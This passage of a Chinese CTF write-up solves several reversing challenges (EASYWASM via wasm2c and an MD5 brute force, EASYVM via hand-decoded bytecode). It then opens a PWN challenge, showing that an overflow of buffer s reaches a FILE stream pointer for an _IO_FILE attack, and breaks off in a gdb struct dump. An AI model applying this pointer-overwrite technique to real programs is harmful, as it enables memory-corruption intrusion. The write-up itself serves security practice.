addr in xrange(0x610318, 0x6105AC, 4): ref = ida_xref.get_first_dref_to(addr) print(hex(addr).center(20,\"-\")) while(ref != ida_idaapi.BADADDR): do_patch(ref) print(\"patch at \" + hex(ref)) ref = ida_xref.get_next_dref_to(addr, ref) print(\"-\"*20) 最后脚本： 12345678secret = [100, 214, 266, 369, 417, 527, 622, 733, 847, 942, 1054, 1106, 1222, 1336, 1441, 1540, 1589, 1686, 1796, 1891, 1996, 2112, 2165, 2260, 2336, 2412, 2498, 2575]n = 0flag = \"\"for i in xrange(0, len(secret)): ch = secret[i] - n n += ch flag += chr(ch)print(flag) EASYWASMgithub 上找到一个将 wasm 转成 c 的工具。命令：wasm2c easywasm.wasm -o easywasm.c 大概内容： 1234567891011121314151617181920212223242526272829303132333435363738394041...static void init_globals(void) &#123; g2 = 0u; g3 = 0u; _flag_enc = 0u; _k = 1104u; _r = 1360u;&#125;...static void _md5(u32 p0, u32 p1, u32 p2) &#123; ...&#125;static u32 _check(u32 p0) &#123; ...&#125;...static void init_memory(void) &#123; memcpy(&amp;((*Z_envZ_memory).data[(*Z_envZ_memoryBaseZ_i)]), data_segment_data_0, 1648);&#125;static void init_table(void) &#123; ...&#125;static void init_exports(void) &#123; ...&#125;void WASM_RT_ADD_PREFIX(init)(void) &#123; init_func_types(); init_globals(); init_memory(); init_table(); init_exports();&#125; 转换成 c 代码后，审计起来还是很累。硬逆出来： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162#!/usr/bin/env pythonimport hashlibdata = [0x35, 0x36, 0x32, 0x66, 0x65, 0x33, 0x63, 0x63, 0x35, 0x30, 0x30, 0x31, 0x34, 0x63, 0x32, 0x36, 0x30, 0x64, 0x39, 0x65, 0x38, 0x63, 0x66, 0x34, 0x65, 0x64, 0x33, 0x38, 0x63, 0x37, 0x37, 0x61, 0x00, 0x63, 0x30, 0x32, 0x32, 0x61, 0x64, 0x30, 0x63, 0x63, 0x30, 0x30, 0x37, 0x35, 0x61, 0x39, 0x61, 0x62, 0x31, 0x34, 0x62, 0x34, 0x31, 0x32, 0x61, 0x31, 0x30, 0x38, 0x32, 0x64, 0x35, 0x66, 0x33, 0x00, 0x36, 0x34, 0x63, 0x32, 0x38, 0x36, 0x63, 0x66, 0x63, 0x36, 0x32, 0x33, 0x61, 0x61, 0x38, 0x64, 0x37, 0x64, 0x66, 0x37, 0x63, 0x30, 0x38, 0x38, 0x65, 0x62, 0x66, 0x37, 0x64, 0x37, 0x31, 0x38, 0x00, 0x38, 0x33, 0x36, 0x36, 0x34, 0x62, 0x64, 0x65, 0x65, 0x34, 0x62, 0x36, 0x31, 0x33, 0x62, 0x37, 0x65, 0x37, 0x61, 0x35, 0x31, 0x62, 0x35, 0x32, 0x31, 0x33, 0x34, 0x37, 0x30, 0x61, 0x38, 0x64, 0x00, 0x62, 0x30, 0x32, 0x30, 0x62, 0x66, 0x35, 0x39, 0x38, 0x61, 0x61, 0x61, 0x32, 0x62, 0x33, 0x65, 0x30, 0x33, 0x65, 0x64, 0x30, 0x32, 0x63, 0x38, 0x35, 0x34, 0x33, 0x36, 0x32, 0x36, 0x38, 0x61, 0x00, 0x34, 0x66, 0x64, 0x61, 0x63, 0x35, 0x61, 0x63, 0x38, 0x30, 0x37, 0x35, 0x30, 0x36, 0x39, 0x33, 0x38, 0x31, 0x30, 0x33, 0x65, 0x37, 0x37, 0x35, 0x63, 0x35, 0x30, 0x30, 0x39, 0x39, 0x65, 0x64, 0x00, 0x34, 0x66, 0x64, 0x61, 0x63, 0x35, 0x61, 0x63, 0x38, 0x30, 0x37, 0x35, 0x30, 0x36, 0x39, 0x33, 0x38, 0x31, 0x30, 0x33, 0x65, 0x37, 0x37, 0x35, 0x63, 0x35, 0x30, 0x30, 0x39, 0x39, 0x65, 0x64, 0x00, 0x63, 0x32, 0x33, 0x31, 0x64, 0x36, 0x30, 0x37, 0x62, 0x36, 0x38, 0x32, 0x33, 0x66, 0x64, 0x30, 0x61, 0x36, 0x38, 0x65, 0x38, 0x31, 0x33, 0x37, 0x36, 0x30, 0x38, 0x30, 0x39, 0x37, 0x35, 0x34, 0x00, 0x64, 0x31, 0x36, 0x38, 0x63, 0x32, 0x31, 0x64, 0x31, 0x30, 0x33, 0x37, 0x31, 0x61, 0x35, 0x61, 0x62, 0x36, 0x31, 0x62, 0x63, 0x66, 0x65, 0x36, 0x63, 0x37, 0x35, 0x39, 0x65, 0x66, 0x36, 0x65, 0x00, 0x66, 0x36, 0x30, 0x64, 0x37, 0x30, 0x39, 0x63, 0x63, 0x66, 0x39, 0x38, 0x39, 0x64, 0x38, 0x34, 0x39, 0x30, 0x32, 0x38, 0x66, 0x39, 0x37, 0x61, 0x30, 0x33, 0x64, 0x32, 0x66, 0x33, 0x62, 0x61, 0x00, 0x61, 0x30, 0x31, 0x38, 0x34, 0x66, 0x38, 0x32, 0x34, 0x30, 0x65, 0x32, 0x66, 0x65, 0x34, 0x36, 0x38, 0x36, 0x31, 0x64, 0x63, 0x38, 0x64, 0x31, 0x35, 0x61, 0x38, 0x31, 0x39, 0x63, 0x62, 0x30, 0x00, 0x39, 0x64, 0x62, 0x65, 0x63, 0x34, 0x31, 0x34, 0x33, 0x33, 0x36, 0x65, 0x37, 0x34, 0x31, 0x65, 0x39, 0x63, 0x37, 0x33, 0x34, 0x32, 0x32, 0x64, 0x66, 0x35, 0x39, 0x64, 0x65, 0x32, 0x39, 0x37, 0x00, 0x36, 0x66, 0x62, 0x35, 0x32, 0x30, 0x39, 0x64, 0x38, 0x66, 0x63, 0x38, 0x62, 0x62, 0x38, 0x35, 0x30, 0x37, 0x32, 0x34, 0x35, 0x62, 0x63, 0x66, 0x61, 0x32, 0x34, 0x61, 0x65, 0x31, 0x31, 0x66, 0x00, 0x36, 0x66, 0x62, 0x35, 0x32, 0x30, 0x39, 0x64, 0x38, 0x66, 0x63, 0x38, 0x62, 0x62, 0x38, 0x35, 0x30, 0x37, 0x32, 0x34, 0x35, 0x62, 0x63, 0x66, 0x61, 0x32, 0x34, 0x61, 0x65, 0x31, 0x31, 0x66, 0x00, 0x30, 0x30, 0x63, 0x37, 0x37, 0x66, 0x62, 0x63, 0x36, 0x30, 0x61, 0x35, 0x62, 0x66, 0x63, 0x34, 0x36, 0x36, 0x64, 0x33, 0x64, 0x30, 0x36, 0x39, 0x38, 0x37, 0x36, 0x65, 0x63, 0x33, 0x34, 0x38, 0x00, 0x30, 0x30, 0x63, 0x37, 0x37, 0x66, 0x62, 0x63, 0x36, 0x30, 0x61, 0x35, 0x62, 0x66, 0x63, 0x34, 0x36, 0x36, 0x64, 0x33, 0x64, 0x30, 0x36, 0x39, 0x38, 0x37, 0x36, 0x65, 0x63, 0x33, 0x34, 0x38, 0x00, 0x64, 0x66, 0x33, 0x33, 0x34, 0x36, 0x34, 0x66, 0x62, 0x34, 0x37, 0x31, 0x63, 0x34, 0x36, 0x61, 0x62, 0x61, 0x66, 0x36, 0x39, 0x31, 0x63, 0x30, 0x30, 0x30, 0x61, 0x30, 0x65, 0x33, 0x30, 0x64, 0x00, 0x34, 0x66, 0x64, 0x61, 0x63, 0x35, 0x61, 0x63, 0x38, 0x30, 0x37, 0x35, 0x30, 0x36, 0x39, 0x33, 0x38, 0x31, 0x30, 0x33, 0x65, 0x37, 0x37, 0x35, 0x63, 0x35, 0x30, 0x30, 0x39, 0x39, 0x65, 0x64, 0x00, 0x66, 0x36, 0x30, 0x64, 0x37, 0x30, 0x39, 0x63, 0x63, 0x66, 0x39, 0x38, 0x39, 0x64, 0x38, 0x34, 0x39, 0x30, 0x32, 0x38, 0x66, 0x39, 0x37, 0x61, 0x30, 0x33, 0x64, 0x32, 0x66, 0x33, 0x62, 0x61, 0x00, 0x66, 0x63, 0x63, 0x39, 0x34, 0x61, 0x32, 0x30, 0x35, 0x39, 0x36, 0x66, 0x32, 0x36, 0x31, 0x39, 0x38, 0x36, 0x38, 0x66, 0x33, 0x61, 0x34, 0x62, 0x66, 0x35, 0x32, 0x65, 0x61, 0x64, 0x66, 0x37, 0x00, 0x30, 0x30, 0x63, 0x37, 0x37, 0x66, 0x62, 0x63, 0x36, 0x30, 0x61, 0x35, 0x62, 0x66, 0x63, 0x34, 0x36, 0x36, 0x64, 0x33, 0x64, 0x30, 0x36, 0x39, 0x38, 0x37, 0x36, 0x65, 0x63, 0x33, 0x34, 0x38, 0x00, 0x64, 0x31, 0x36, 0x38, 0x63, 0x32, 0x31, 0x64, 0x31, 0x30, 0x33, 0x37, 0x31, 0x61, 0x35, 0x61, 0x62, 0x36, 0x31, 0x62, 0x63, 0x66, 0x65, 0x36, 0x63, 0x37, 0x35, 0x39, 0x65, 0x66, 0x36, 0x65, 0x00, 0x39, 0x64, 0x62, 0x65, 0x63, 0x34, 0x31, 0x34, 0x33, 0x33, 0x36, 0x65, 0x37, 0x34, 0x31, 0x65, 0x39, 0x63, 0x37, 0x33, 0x34, 0x32, 0x32, 0x64, 0x66, 0x35, 0x39, 0x64, 0x65, 0x32, 0x39, 0x37, 0x00, 0x66, 0x63, 0x63, 0x39, 0x34, 0x61, 0x32, 0x30, 0x35, 0x39, 0x36, 0x66, 0x32, 0x36, 0x31, 0x39, 0x38, 0x36, 0x38, 0x66, 0x33, 0x61, 0x34, 0x62, 0x66, 0x35, 0x32, 0x65, 0x61, 0x64, 0x66, 0x37, 0x00, 0x39, 0x62, 0x33, 0x37, 0x64, 0x62, 0x30, 0x39, 0x31, 0x39, 0x37, 0x39, 0x62, 0x65, 0x64, 0x66, 0x30, 0x30, 0x61, 0x37, 0x30, 0x39, 0x35, 0x38, 0x35, 0x31, 0x62, 0x61, 0x36, 0x66, 0x35, 0x39, 0x00, 0x30, 0x30, 0x63, 0x37, 0x37, 0x66, 0x62, 0x63, 0x36, 0x30, 0x61, 0x35, 0x62, 0x66, 0x63, 0x34, 0x36, 0x36, 0x64, 0x33, 0x64, 0x30, 0x36, 0x39, 0x38, 0x37, 0x36, 0x65, 0x63, 0x33, 0x34, 0x38, 0x00, 0x66, 0x36, 0x30, 0x64, 0x37, 0x30, 0x39, 0x63, 0x63, 0x66, 0x39, 0x38, 0x39, 0x64, 0x38, 0x34, 0x39, 0x30, 0x32, 0x38, 0x66, 0x39, 0x37, 0x61, 0x30, 0x33, 0x64, 0x32, 0x66, 0x33, 0x62, 0x61, 0x00, 0x66, 0x63, 0x63, 0x39, 0x34, 0x61, 0x32, 0x30, 0x35, 0x39, 0x36, 0x66, 0x32, 0x36, 0x31, 0x39, 0x38, 0x36, 0x38, 0x66, 0x33, 0x61, 0x34, 0x62, 0x66, 0x35, 0x32, 0x65, 0x61, 0x64, 0x66, 0x37, 0x00, 0x64, 0x31, 0x36, 0x38, 0x63, 0x32, 0x31, 0x64, 0x31, 0x30, 0x33, 0x37, 0x31, 0x61, 0x35, 0x61, 0x62, 0x36, 0x31, 0x62, 0x63, 0x66, 0x65, 0x36, 0x63, 0x37, 0x35, 0x39, 0x65, 0x66, 0x36, 0x65, 0x00, 0x66, 0x36, 0x30, 0x64, 0x37, 0x30, 0x39, 0x63, 0x63, 0x66, 0x39, 0x38, 0x39, 0x64, 0x38, 0x34, 0x39, 0x30, 0x32, 0x38, 0x66, 0x39, 0x37, 0x61, 0x30, 0x33, 0x64, 0x32, 0x66, 0x33, 0x62, 0x61, 0x00, 0x31, 0x38, 0x33, 0x33, 0x34, 0x32, 0x39, 0x39, 0x37, 0x66, 0x66, 0x65, 0x64, 0x34, 0x62, 0x33, 0x31, 0x38, 0x39, 0x65, 0x39, 0x37, 0x37, 0x64, 0x30, 0x37, 0x37, 0x61, 0x36, 0x30, 0x62, 0x34, 0x00, 0x66, 0x34, 0x30, 0x34, 0x61, 0x33, 0x33, 0x36, 0x38, 0x64, 0x32, 0x64, 0x38, 0x66, 0x35, 0x37, 0x34, 0x36, 0x34, 0x66, 0x37, 0x33, 0x39, 0x64, 0x34, 0x65, 0x64, 0x30, 0x31, 0x63, 0x30, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x78, 0xa4, 0x6a, 0xd7, 0x56, 0xb7, 0xc7, 0xe8, 0xdb, 0x70, 0x20, 0x24, 0xee, 0xce, 0xbd, 0xc1, 0xaf, 0x0f, 0x7c, 0xf5, 0x2a, 0xc6, 0x87, 0x47, 0x13, 0x46, 0x30, 0xa8, 0x01, 0x95, 0x46, 0xfd, 0xd8, 0x98, 0x80, 0x69, 0xaf, 0xf7, 0x44, 0x8b, 0xb1, 0x5b, 0xff, 0xff, 0xbe, 0xd7, 0x5c, 0x89, 0x22, 0x11, 0x90, 0x6b, 0x93, 0x71, 0x98, 0xfd, 0x8e, 0x43, 0x79, 0xa6, 0x21, 0x08, 0xb4, 0x49, 0x62, 0x25, 0x1e, 0xf6, 0x40, 0xb3, 0x40, 0xc0, 0x51, 0x5a, 0x5e, 0x26, 0xaa, 0xc7, 0xb6, 0xe9, 0x5d, 0x10, 0x2f, 0xd6, 0x53, 0x14, 0x44, 0x02, 0x81, 0xe6, 0xa1, 0xd8, 0xc8, 0xfb, 0xd3, 0xe7, 0xe6, 0xcd, 0xe1, 0x21, 0xd6, 0x07, 0x37, 0xc3, 0x87, 0x0d, 0xd5, 0xf4, 0xed, 0x14, 0x5a, 0x45, 0x05, 0xe9, 0xe3, 0xa9, 0xf8, 0xa3, 0xef, 0xfc, 0xd9, 0x02, 0x6f, 0x67, 0x8a, 0x4c, 0x2a, 0x8d, 0x42, 0x39, 0xfa, 0xff, 0x81, 0xf6, 0x71, 0x87, 0x22, 0x61, 0x9d, 0x6d, 0x0c, 0x38, 0xe5, 0xfd, 0x44, 0xea, 0xbe, 0xa4, 0xa9, 0xcf, 0xde, 0x4b, 0x60, 0x4b, 0xbb, 0xf6, 0x70, 0xbc, 0xbf, 0xbe, 0xc6, 0x7e, 0x9b, 0x28, 0xfa, 0x27, 0xa1, 0xea, 0x85, 0x30, 0xef, 0xd4, 0x05, 0x1d, 0x88, 0x04, 0x39, 0xd0, 0xd4, 0xd9, 0xe5, 0x99, 0xdb, 0xe6, 0xf8, 0x7c, 0xa2, 0x1f, 0x65, 0x56, 0xac, 0xc4, 0x44, 0x22, 0x29, 0xf4, 0x97, 0xff, 0x2a, 0x43, 0xa7, 0x23, 0x94, 0xab, 0x39, 0xa0, 0x93, 0xfc, 0xc3, 0x59, 0x5b, 0x65, 0x92, 0xcc, 0x0c, 0x8f, 0x7d, 0xf4, 0xef, 0xff, 0xd1, 0x5d, 0x84, 0x85, 0x4f, 0x7e, 0xa8, 0x6f, 0xe0, 0xe6, 0x2c, 0xfe, 0x14, 0x43, 0x01, 0xa3, 0xa1, 0x11, 0x08, 0x4e, 0x82, 0x7e, 0x53, 0xf7, 0x35, 0xf2, 0x3a, 0xbd, 0xbb, 0xd2, 0xd7, 0x2a, 0x91, 0xd3, 0x86, 0xeb, 0x07, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00, 0x0e, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00, 0x0e, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00, 0x0e, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00, 0x0e, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x17, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x17, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x17, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x17, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x00, 0x00, 0x15, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x00, 0x00, 0x15, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x00, 0x00, 0x15, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x00, 0x00, 0x15, 0x00, 0x00, 0x00, 0x32, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33]s = ''for c in data: s += chr(c)# print senc = '562fe3cc50014c260d9e8cf4ed38c77ac022ad0cc0075a9ab14b412a1082d5f364c286cfc623aa8d7df7c088ebf7d71883664bdee4b613b7e7a51b5213470a8db020bf598aaa2b3e03ed02c85436268a4fdac5ac807506938103e775c50099ed4fdac5ac807506938103e775c50099edc231d607b6823fd0a68e813760809754d168c21d10371a5ab61bcfe6c759ef6ef60d709ccf989d849028f97a03d2f3baa0184f8240e2fe46861dc8d15a819cb09dbec414336e741e9c73422df59de2976fb5209d8fc8bb8507245bcfa24ae11f6fb5209d8fc8bb8507245bcfa24ae11f00c77fbc60a5bfc466d3d069876ec34800c77fbc60a5bfc466d3d069876ec348df33464fb471c46abaf691c000a0e30d4fdac5ac807506938103e775c50099edf60d709ccf989d849028f97a03d2f3bafcc94a20596f2619868f3a4bf52eadf700c77fbc60a5bfc466d3d069876ec348d168c21d10371a5ab61bcfe6c759ef6e9dbec414336e741e9c73422df59de297fcc94a20596f2619868f3a4bf52eadf79b37db091979bedf00a7095851ba6f5900c77fbc60a5bfc466d3d069876ec348f60d709ccf989d849028f97a03d2f3bafcc94a20596f2619868f3a4bf52eadf7d168c21d10371a5ab61bcfe6c759ef6ef60d709ccf989d849028f97a03d2f3ba183342997ffed4b3189e977d077a60b4f404a3368d2d8f57464f739d4ed01c0e'e = []for i in range(len(enc) / 32): e.append(enc[32*i:32*i+32])print ekey = '23333333333333333333333333333333'[:-1]print keyflag = ''for i in range(32): for ch in range(256): x = hashlib.md5(key + chr(ch)).digest() x = x.encode('hex').lower() x = hashlib.md5(x).digest() x = x.encode('hex').lower() if x == e[i]: flag += chr(ch) breakprint flag EASYVM第一次做的时候手撸： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491501511521531541551561571581591601611621631641651661671681691701711721731741751761771781791801811821831841851861871881891901911921931941951961971981992002012020x05, 0x01, 0x0B, // mov r1, rB0x13, 0x03, 0x03, // xor r3, r30x13, 0x00, 0x00, // xor r0, r00x13, 0x04, 0x04, // xor r4, r4r1 = rB;r3 = r0 = r4 = 0;0x28, // enter the looploop:0x0C, 0x00, 0x33, // add r0, 0x330x14, 0x00, 0x20, // mov r0, r0 mod 0x200x05, 0x09, 0x01, // mov r9, r10x11, 0x09, 0x00, // add_pch r9, r00x0B, 0x0A, 0x09, // ldr_ch rA, r90x01, 0x04, 0x0A, // mov r4, rA0x1B, 0x05, 0x04, // push r5, r40x0C, 0x03, 0x01, // add r3, 0x010x24, 0x03, 0x20, // cmpl r3, 0x200x28, // jl loopwhile(1) // loop 0x20 times&#123; r0 += 0x33; r0 = r0 % 0x20; r9 = r1; r9 += r0; rA = r9; r4 = rA; r5 = r4 + 1; r3 += 0x01; if(r3 &gt;= 0x20) break;&#125;0x13, 0x00, 0x00, // xor r0, r00x07, 0x08, 0x05, // lea_int r8, r50x0E, 0x08, 0xE0, // add r8, 0xE00x07, 0x02, 0x08, // lea_int r2, r80x09, 0x0A, 0x02, // ldr_int rA, r20x01, 0x00, 0x0A, // mov r0, rA0x18, 0x00, 0xE0, // and r0, 0xE00x1E, 0x00, 0x05, // shr r0, 0x050x01, 0x04, 0x00, // mov r4, r00x13, 0x03, 0x03, // xor r3, r3r0 = 0;r8 = r5;r8 += 0xE0;r2 = r8;rA = r2;r0 = rA;r0 &amp;= 0xE0;r0 &gt;&gt;= 0x05;r0 &amp;= 0xFF;r4 = r0;r3 = 0;0x28, // enter the looploop:0x09, 0x0A, 0x02, // ldr_int rA, r20x01, 0x00, 0x0A, // mov r0, rA0x18, 0x00, 0x1F, // and r0, 0x1F0x20, 0x00, 0x03, // shl r0, 0x030x1B, 0x05, 0x00, // push r5, r00x07, 0x08, 0x05, // lea_int r8, r50x0E, 0x08, 0xE0, // add r8, 0xE00x07, 0x02, 0x08, // lea_int r2, r80x09, 0x0A, 0x02, // ldr_int rA, r20x01, 0x00, 0x0A, // mov, r0, rA0x18, 0x00, 0xE0, // and r0, 0xE00x1E, 0x00, 0x05, // shr r0, 0x050x1D, 0x05, 0x0A, // pop r5, rA0x0D, 0x0A, 0x00, // add rA, r00x1B, 0x05, 0x0A, // push r5, rA0x0C, 0x03, 0x01, // add r3, 0x010x24, 0x03, 0x1F, // cmpl r3, 0x1F0x28, // jl loopwhile(1) // loop 0x1F times&#123; rA = r2; r0 = rA; r0 &amp;= 0x1F; r0 &lt;&lt;= 0x03; r0 &amp;= 0xFF; r5 = r0 + 1; r8 = r5; r8 += 0xE0; r2 = r8; rA = r2; r0 = rA; r0 &amp;= 0xE0; r0 &gt;&gt;= 0x05; r0 &amp;= 0xFF; rA = r5 - 1; rA += r0; r5 = rA + 1; r3 += 1; if(r3 &gt;= 0x1F) break;&#125;0x09, 0x0A, 0x02, // ldr_int rA, r20x01, 0x00, 0x0A, // mov r0, rA0x18, 0x00, 0x1F, // and r0, 0x1F0x20, 0x00, 0x03, // shl r0, 0x030x0D, 0x00, 0x04, // add r0, r40x1B, 0x05, 0x00, // push r5, r00x13, 0x03, 0x03, // xor r3, r30x03, 0x04, 0x0D, // mov, r4, rD // 0xEFBEADDE0x28, // enter the looprA = r2;r0 = rA;r0 &amp;= 0x1F;r0 &lt;&lt;= 0x03;r0 &amp;= 0xFF;r0 += r4;r5 = r0 + 1;r3 = 0;r4 = rD;loop:0x07, 0x08, 0x05, // lea_int r8, r50x0E, 0x08, 0xE0, // add r8, 0xE00x07, 0x02, 0x08, // lea_int r2, r80x09, 0x0A, 0x02, // ldr_int rA, r20x01, 0x00, 0x0A, // mov, r0, rA0x1B, 0x05, 0x00, // push r5, r00x01, 0x00, 0x04, // mov r0, r40x0D, 0x00, 0x03, // and r0, r30x1D, 0x05, 0x0A, // pop r5, rA0x13, 0x0A, 0x00, // xor rA, r00x1B, 0x05, 0x0A, // push r5, rA0x22, 0x04, 0x08, // ror r4, 0x080x0C, 0x03, 0x01, // add r3, 0x010x24, 0x03, 0x20, // cmpl r3, 0x200x28, // jl loopwhile(1) // loop 0x20 times&#123; r8 = r5; r8 += 0xE0; r2 = r8; rA = r2; r0 = rA; r5 = r0 + 1; r0 = r4; r0 += r3; rA = r5 - 1; rA ^= r0; r5 = rA + 1; r4 = (1 &lt;&lt; 8 - 1) &amp; (r4 &lt;&lt; 24) + ((1 &lt;&lt; 24 - 1) &amp; (r4 &gt;&gt; 8)); r3 += 1; if(r3 &gt;= 0x20) break;&#125;0x13, 0x03, 0x03, // xor r3, r30x13, 0x04, 0x04, // xor r4, r40x05, 0x01, 0x0C, // mov r1, rC // enc0x28, // enter the loopr3 = r4 = 0;r1 = rC;loop:0x05, 0x09, 0x01, // mov r9, r10x11, 0x09, 0x03, // add_pch r9, r30x0B, 0x0A, 0x09, // ldr_ch rA, r90x01, 0x00, 0x0A, // mov r0, rA0x1B, 0x05, 0x00, // push r5, r00x07, 0x08, 0x05, // lea_int r8, r50x0E, 0x08, 0xDF, // add r8, 0xDF0x09, 0x0A, 0x08, // ldr_int rA, r80x1D, 0x05, 0x00, // pop r5, r00x1B, 0x05, 0x00, // push r5, r00x27, 0x00, 0x0A, // cmpeq r0, rA0x17, 0x04, 0x07, // mov r4, r4 | r70x0C, 0x03, 0x01, // add r3, 0x010x24, 0x03, 0x20, // cmpl r3, 0x200x28 // jl loopwhile(1) // loop 0x20 times&#123; r9 = r1; r9 += r3; rA = r9; r0 = rA; r5 = r0 + 1; r8 = r5; r8 += 0xDF; rA = r8; r0 = r5 - 1; r5 = r0 + 1; r0 != rA r4 |= r7; r3 += 1; if(r3 &gt;= 0x20) break;&#125; 其实还是挺清楚的，可以逆出来。脚本如下： 123456789101112131415161718192021# reverse step3enc1 = [0x75, 0x85, 0xD1, 0x39, 0x0B, 0x29, 0xCD, 0x77, 0x6D, 0x9F, 0x73, 0x23, 0x61, 0x8B, 0x4D, 0x45, 0x9D, 0x8F, 0x5B, 0x11, 0xC1, 0xC9, 0xE5, 0xCF, 0x45, 0xE5, 0xB1, 0xB3, 0x41, 0xD9, 0xCF, 0xCF]key = [0xDE, 0xAD, 0xBE, 0xEF]enc2 = [enc1[i] ^ ((key[i % 4] + i) &amp; 0xFF) for i in range(32)]# reverse step2enc3 = [0 for i in range(32)]def f(a, b): return ((a &lt;&lt; 5) &amp; 0xE0 | (b &gt;&gt; 3) &amp; 0x1F)for i in range(1, 32): enc3[i] = f(enc2[i - 1], enc2[i])enc3[0] = f(enc2[31], enc2[0])# reverse step1enc4 = [0 for i in range(32)]j = 0for i in range(32): j += 0x33 enc4[j % 0x20] = enc3[i]flag = ''for ch in enc4: flag += chr(ch)print flag PWNChallenge1利用了_IO_FILE的相关漏洞，和之前一道练习题很类似： 123456789101112131415161718192021222324__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; int c; // [rsp+Ch] [rbp-4h] stream = fopen(\"test.txt\", \"r\"); init_func(); while ( 1 ) &#123; while ( 1 ) &#123; putchar('&gt;'); c = readline(); if ( c != 1 ) break; get_s(); &#125; if ( c != 2 ) break; put_s(); &#125; if ( c == 3 ) close_stream(); return 0LL;&#125; 输入的 s 可以覆盖掉 stream 指针，偏移是 0x100。 1234.bss:00000000006010C0 s db 100h dup(?) ; DATA XREF: get_s+4↑o.bss:00000000006010C0 ; put_s+4↑o.bss:00000000006011C0 ; FILE *stream.bss:00000000006011C0 stream dq ? ; DATA XREF: close_stream+4↑r 关于_IO_FILE 一些 symbol 在 gdb 里可以看： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263assassinq&gt;&gt; p sizeof(FILE)$1 = 0xd8assassinq&gt;&gt; p sizeof(struct _IO_FILE_plus)$2 = 0xe0assassinq&gt;&gt; p *(struct _IO_FILE_plus *)stdin$3 = &#123; file = &#123; _flags = 0xfbad208b, _IO_read_ptr = 0x7ffff7dcfa84 &lt;_IO_2_1_stdin_+132&gt; &quot;&quot;, _IO_read_end = 0x7ffff7dcfa84 &lt;_IO_2_1_stdin_+132&gt; &quot;&quot;, _IO_read_base = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\\n&quot;, _IO_write_base = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\\n&quot;, _IO_write_ptr = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\\n&quot;, _IO_write_end = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\\n&quot;, _IO_buf_base = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\\n&quot;, _IO_buf_end = 0x7ffff7dcfa84 &lt;_IO_2_1_stdin_+132&gt; &quot;&quot;, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x0, _fileno = 0x0, _flags2 = 0x0, _old_offset = 0xffffffffffffffff, _cur_column = 0x0, _vtable_offset = 0x0, _shortbuf = &quot;\\n&quot;, _lock = 0x7ffff7dd18d0 &lt;_IO_stdfile_0_lock&gt;, _offset = 0xffffffffffffffff, _codecvt = 0x0, _wide_data = 0x7ffff7dcfae0 &lt;_IO_wide_data_0&gt;, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0x0, _mode = 